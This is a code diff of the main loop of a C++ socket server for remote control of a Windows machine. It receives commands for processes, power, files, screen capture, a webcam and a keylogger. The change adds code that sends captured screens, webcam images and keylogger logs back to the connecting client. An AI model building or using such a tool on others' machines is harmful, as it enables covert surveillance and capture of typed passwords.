@@ -1,42 +1,33 @@
 #include "utils.h"
 
 int main() {
-    //cout << "o--------------------- INSTRUCTIONS ---------------------o\n";
-    //cout << "|                                                        |\n";
-    //cout << "|   list    [app|service]                                |\n";
-    //cout << "|   start   [app|service]      [appPath|serviceName]     |\n";
-    //cout << "|   stop    [app|service]      [processID|serviceName]   |\n";
-    //cout << "|   power   [shutdown|restart]                           |\n";
-    //cout << "|   file    [copy|delete]      srcPath [desPath]         |\n";
-    //cout << "|   capture screen             outPath                   |\n";
-    //cout << "|   start   [camera|keylogger]                           |\n";
-    //cout << "|   stop    [camera|keylogger]                           |\n";
-    //cout << "|   exit                                                 |\n";
-    //cout << "|                                                        |\n";
-    //cout << "o--------------------------------------------------------o\n";
+    // Set up handlers
+    map<string, map<string, function<void()>>> handlers = setupHandlers();
     
-    map<wstring, map<wstring, function<void()>>> handlers = setupHandlers();
-    
+    // Init socket
     if (!AfxSocketInit()) {
         cerr << "\nFailed to initialize sockets. Error: " << GetLastError() << endl;
         return 0;
     }
 
+    // Create server socket
     CSocket server;
     if (!server.Create(PORT)) {
         cerr << "\nFailed to create server socket. Error: " << GetLastError() << endl;
         return 0;
     }
 
+    // Listen for connection
     if (!server.Listen()) {
         cerr << "\nServer failed to listen. Error: " << GetLastError() << endl;
         return 0;
     }
     cout << "\nServer is listening on port " << PORT << "...\n";
         
-    vector<wchar_t> buffer(BUFFER_SIZE);
-    wstring cmd, opt;
-    while (cmd.find(L"exit") == string::npos) {
+    char buffer[BUFFER_SIZE]{ 0 };
+    string cmd, opt;
+    while (cmd.find("exit") == string::npos) {
+        // Accept client connection
         CSocket client;
         if (!server.Accept(client)) {
             cerr << "\nFailed to accept client connection. Error: " << GetLastError() << endl;
@@ -44,14 +35,17 @@ int main() {
         }
         cout << "\nClient connected!\n";
 
-        client.Receive(buffer.data(), BUFFER_SIZE * sizeof(wchar_t));
-        wcout << "\nReceived from client: " << buffer.data() << endl;
+        // Receive message from client
+        client.Receive(buffer, BUFFER_SIZE);
+        cout << "\nReceived from client: " << buffer << endl;
 
-        inp.str(buffer.data());
+        // Parse message to stringstream for extracting command
+        inp.str(buffer);
         inp.seekg(0);
         inp >> cmd >> opt;
 
         try {
+            // Call corresponding handler
             handlers[cmd][opt]();
         }
         catch (const exception& e) {
@@ -59,14 +53,32 @@ int main() {
                 out << "\nException: " << e.what() << endl;
             }
             else {
-                out << "\nInvalid command!\n";
+                out << "\nInvalid command!\n\n" << getInstruction();
             }
         }
-        wstring response = out.str();
-        out.str(L"");
-        client.Send(response.c_str(), (response.size() + 1) * sizeof(wchar_t));
+        
+        // Send message to client
+        string response = out.str();
+        out.str("");
+        client.Send(response.c_str(), response.size() + 1);
+
+        // Send file if needed
+        if (opt == "screen") {
+            sendFile(client, screenCapturePath);
+        }
+        else if (opt == "camera") {
+            sendFile(client, webcamCapturePath);
+        }
+        else if (cmd == "stop" && opt == "keylogger") {
+            sendFile(client, keyloggerCapturePath);
+        }
+        
+        // Close client socket
         client.Close();
+        cout << "\nClient disconnected!\n";
     }
+
+    // Close server socket
     server.Close();
     
     return 0;
